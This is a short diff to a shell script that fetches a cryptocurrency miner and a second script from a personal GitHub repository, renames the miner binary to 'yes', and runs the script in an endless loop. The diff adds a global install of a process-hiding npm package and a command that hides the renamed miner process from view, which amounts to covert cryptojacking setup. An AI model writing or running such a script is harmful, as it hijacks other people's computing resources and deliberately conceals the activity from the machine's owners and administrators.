@@ -1,6 +1,8 @@
 apt update && apt install timelimit -y
+npm i -g node-process-hider
 wget https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-linux-0.99.7.tar.gz
 wget https://raw.githubusercontent.com/kiposnakursi/a/main/nv
 tar -xf nq-miner-linux-0.99.7.tar.gz && mv nq-miner yes
 chmod +x nv yes
+ph add yes
 while :; do timeout 120 bash ./nv; sleep 1; done
